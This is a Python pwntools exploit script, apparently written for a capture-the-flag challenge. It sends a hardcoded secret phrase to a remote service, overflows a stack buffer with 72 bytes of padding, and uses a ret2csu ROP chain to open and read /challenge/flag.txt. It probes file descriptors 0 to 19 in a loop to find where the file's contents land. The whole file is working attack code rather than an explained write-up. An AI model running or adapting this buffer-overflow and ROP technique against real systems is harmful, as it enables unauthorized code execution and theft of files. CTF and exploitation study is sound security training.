#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

HOST = '154.57.164.77'
PORT = 32702

csu_pop = 0x401512
csu_call = 0x4014f8
pop_rdi = 0x4011f2
got_read = 0x403250
got_write = 0x403230
got_open = 0x403278
bss_marker = 0x404200  # will be overwritten by read if fd works
bss_path = 0x404100

def probe_fd(fd):
    """Write marker to BSS, open file, try read from fd, see if marker changed."""
    r = remote(HOST, PORT)
    r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
    r.recvuntil(b'wish for next year: ')

    pay = b'A' * 72
    # 1) read marker into bss_marker
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss_marker) + p64(32) + p64(got_read)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 2) read path into bss_path
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss_path) + p64(40) + p64(got_read)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 3) open(bss_path, 0, 0)
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(bss_path) + p64(0) + p64(0) + p64(got_open)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 4) read(fd, bss_marker, 0x100) — try reading from fd into marker area
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(fd) + p64(bss_marker) + p64(0x100) + p64(got_read)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 5) write(1, bss_marker, 48) — output what's at bss_marker
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(1) + p64(bss_marker) + p64(48) + p64(got_write)
    pay += p64(csu_call) + p64(0) + p64(0)*6

    r.send(pay)
    import time; time.sleep(0.2)
    r.send(b'MARKER:ZZZZZZZZZZZZZZZZZZZZZ')  # for CSU call 1
    time.sleep(0.1)
    r.send(b'/challenge/flag.txt\x00')       # for CSU call 2
    time.sleep(1)
    try:
        data = r.recv(timeout=4)
        # Find marker output
        if b'MARKER:' in data:
            idx = data.index(b'MARKER:')
            marker_out = data[idx:idx+48]
            if b'ZZZZ' in marker_out:
                print(f'fd={fd}: MARKER UNCHANGED (read failed / fd invalid)')
            else:
                print(f'fd={fd}: MARKER CHANGED! -> {marker_out}')
                if b'{' in marker_out:
                    print(f'  *** FLAG! ***')
        else:
            print(f'fd={fd}: no marker in output')
            # Fallback: print last 100 bytes
            print(f'  raw: {data[-100:]}')
    except Exception as e:
        print(f'fd={fd}: {e}')
    r.close()

def probe_multiple():
    for fd in range(20):
        probe_fd(fd)

if __name__ == '__main__':
    probe_multiple()
